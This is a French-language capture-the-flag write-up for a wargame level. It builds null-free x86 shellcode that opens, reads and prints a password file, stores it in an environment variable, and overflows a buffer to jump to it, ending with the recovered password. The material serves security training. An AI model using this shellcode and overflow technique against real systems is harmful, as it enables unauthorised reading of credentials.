@@ -1,0 +1,162 @@
+ce binaire ne nous laisse pas utiliser execve donc on ne peut pas executer un shell.
+Donc on va creer un shellcode qui va nous permettre de open, read, write le contenu de password.
+d'abord je vais convertir le string "/home/users/level05/.pass" en hex pour pouvoir inserer le string dans notre shellcode.
+>>> test = "/home/users/level05/.pass"
+>>> [test[i:i+4] for i in range(0, len(test), 4)]
+['/hom', 'e/us', 'ers/', 'leve', 'l05/', '.pas', 's']
+>>> splited_path = [test[i:i+4] for i in range(0, len(test), 4)]
+>>> hexval = []
+>>> for line in splited_path:
+...     hexval.append([hex(ord(x)) for x in line])
+...
+>>> hexval
+[['0x2f', '0x68', '0x6f', '0x6d'], ['0x65', '0x2f', '0x75', '0x73'], ['0x65', '0x72', '0x73', '0x2f'], ['0x6c', '0x65', '0x76', '0x65'], ['0x6c', '0x30', '0x35', '0x2f'], ['0x2e', '0x70', '0x61', '0x73'], ['0x73']]
+>>> concat_hex = ["".join(x[::-1]) for x in hexval]
+>>> concat_hex
+['0x6d0x6f0x680x2f', '0x730x750x2f0x65', '0x2f0x730x720x65', '0x650x760x650x6c', '0x2f0x350x300x6c', '0x730x610x700x2e', '0x73']
+>>> ["0x" + x.replace("0x", "") for x in concat_hex]
+['0x6d6f682f', '0x73752f65', '0x2f737265', '0x6576656c', '0x2f35306c', '0x7361702e', '0x73']
+
+Donc on va push ces valeurs dans la stack puis on va utiliser ce string pour faire open.
+
+	segment .text
+	global _start
+
+	_start:
+
+	push 0x73
+	push 0x7361702e
+	push 0x2f35306c
+	push 0x6576656c
+	push 0x2f737265
+	push 0x73752f65
+	push 0x6d6f682f
+
+	mov eax, 0x5      ; 5 = sys_open
+	mov ebx, esp
+	xor ecx, ecx
+	xor edx, edx
+	int 0x80
+
+	sub esp, 100
+	mov ebx, eax
+	mov eax, 0x3      ; 3 = sys_read
+	mov ecx, esp      ; buf
+	mov edx, 100
+	int 0x80
+
+	mov eax, 0x4      ; 4 = sys_write
+	mov ebx, 1        ; stdout
+	mov ecx, esp
+	mov edx, 100
+	int 0x80
+
+root@debian-ryaoi:~# nasm -felf -o shellcode.o shellcode.asm
+root@debian-ryaoi:~# ld -melf_i386 shellcode.o -o shellcode
+
+on a notre shellcode qui est pret.
+
+root@debian-ryaoi:~# r2 shellcode
+Warning: Cannot initialize dynamic strings
+ -- This binary may contain traces of human
+ [0x08048060]> aaa
+ [x] Analyze all flags starting with sym. and entry0 (aa)
+ [x] Analyze function calls (aac)
+ [x] Analyze len bytes of instructions for references (aar)
+ [x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+ [x] Type matching analysis for all functions (afta)
+ [x] Use -AA or aaaa to perform additional experimental analysis.
+ [0x08048060]> afl
+ 0x08048060    1 83           entry0
+ [0x08048060]> pdf @ entry0
+             ;-- section..text:
+                         ;-- _start:
+                                     ;-- eip:
+                                     / (fcn) entry0 83
+                                     |   entry0 ();
+                                     |           0x08048060      6a73           push 0x73                   ; 's' ; 115 ; [01] -r-x section size 83 named .text
+                                     |       |   0x08048062      682e706173     push 0x7361702e             ; '.pas'
+                                     |     |||   0x08048067      686c30352f     push 0x2f35306c             ; 'l05/'
+                                     |     |||   0x0804806c      686c657665     push 0x6576656c             ; 'leve'
+                                     |    ||||   0x08048071      686572732f     push 0x2f737265             ; 'ers/'
+                                     |    ||||   0x08048076      68652f7573     push 0x73752f65             ; 'e/us'
+                                     |    ||||   0x0804807b      682f686f6d     push 0x6d6f682f             ; '/hom'
+                                     |    ||||   0x08048080      b805000000     mov eax, 5
+                                     |    ||||   0x08048085      89e3           mov ebx, esp
+                                     |    ||||   0x08048087      31c9           xor ecx, ecx
+                                     |    ||||   0x08048089      31d2           xor edx, edx
+                                     |    ||||   0x0804808b      cd80           int 0x80
+                                     |    ||||   0x0804808d      83ec64         sub esp, 0x64               ; 'd'
+                                     |    ||||   0x08048090      89c3           mov ebx, eax
+                                     |    ||||   0x08048092      b803000000     mov eax, 3
+                                     |    ||||   0x08048097      89e1           mov ecx, esp
+                                     |    ||||   0x08048099      ba64000000     mov edx, 0x64               ; 'd' ; 100
+                                     |    ||||   0x0804809e      cd80           int 0x80
+                                     |    ||||   0x080480a0      b804000000     mov eax, 4
+                                     |    ||||   0x080480a5      bb01000000     mov ebx, 1
+                                     |    ||||   0x080480aa      89e1           mov ecx, esp
+                                     |    ||||   0x080480ac      ba64000000     mov edx, 0x64               ; 'd' ; 100
+                                     \    ||||   0x080480b1      cd80           int 0x80
+
+
+
+On remarque qu'il y a des 0x00 dans nos shellcode donc on va les modifier en sorte quil n'y a pas de 0x00
+
+root@debian-ryaoi:~# objdump -D -M intel shellcode
+
+shellcode:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+8048060:	6a 73                	push   0x73
+8048062:	68 2e 70 61 73       	push   0x7361702e
+8048067:	68 6c 30 35 2f       	push   0x2f35306c
+804806c:	68 6c 65 76 65       	push   0x6576656c
+8048071:	68 65 72 73 2f       	push   0x2f737265
+8048076:	68 65 2f 75 73       	push   0x73752f65
+804807b:	68 2f 68 6f 6d       	push   0x6d6f682f
+8048080:	b0 05                	mov    al,0x5
+8048082:	89 e3                	mov    ebx,esp
+8048084:	31 c9                	xor    ecx,ecx
+8048086:	31 d2                	xor    edx,edx
+8048088:	cd 80                	int    0x80
+804808a:	83 ec 64             	sub    esp,0x64
+804808d:	89 c3                	mov    ebx,eax
+804808f:	b0 03                	mov    al,0x3
+8048091:	89 e1                	mov    ecx,esp
+8048093:	b2 64                	mov    dl,0x64
+8048095:	cd 80                	int    0x80
+8048097:	b0 04                	mov    al,0x4
+8048099:	b3 01                	mov    bl,0x1
+804809b:	89 e1                	mov    ecx,esp
+804809d:	b2 64                	mov    dl,0x64
+804809f:	cd 80                	int    0x80
+
+>>> test = """
+... 0x6a,0x73,0x68,0x2e,0x70,0x61,0x73,0x68,0x6c,0x30,0x35,
+... 0x2f,0x68,0x6c,0x65,0x76,0x65,0x68,0x65,0x72,0x73,0x2f,
+... 0x68,0x65,0x2f,0x75,0x73,0x68,0x2f,0x68,0x6f,0x6d,0xb0,
+... 0x05,0x89,0xe3,0x31,0xc9,0x31,0xd2,0xcd,0x80,0x83,0xec,
+... 0x64,0x89,0xc3,0xb0,0x03,0x89,0xe1,0xb2,0x64,0xcd,0x80,
+... 0xb0,0x04,0xb3,0x01,0x89,0xe1,0xb2,0x64,0xcd,0x80
+... """
+>>> test = test.replace("\n", "").replace("0x", '\\x').replace(',', '')
+>>>
+>>> print(test)
+\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\xb0\x05\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x83\xec\x64\x89\xc3\xb0\x03\x89\xe1\xb2\x64\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x64\xcd\x80
+>>>
+
+level04@OverRide:~$ export SHELLCODE=`python -c 'print("\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\xb0\x05\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x83\xec\x64\x89\xc3\xb0\x03\x89\xe1\xb2\x64\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x64\xcd\x80")'`
+
+Apres qu'on a mis nos shellcode dans variable d'env on va compiler un program qui donne son address
+
+level04@OverRide:~$ /tmp/shellcode
+0xffffd899
+
+on sait que l'address de SHELLCODE= est a 0xffffd899 donc si on veut commencer a partir de shellcode, il faut ajouter 10 donc notre shellcode ce retrouve a 0xffffd8a3
+level04@OverRide:~$ python -c 'print("A"*156 + "\xa3\xd8\xff\xff")' | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
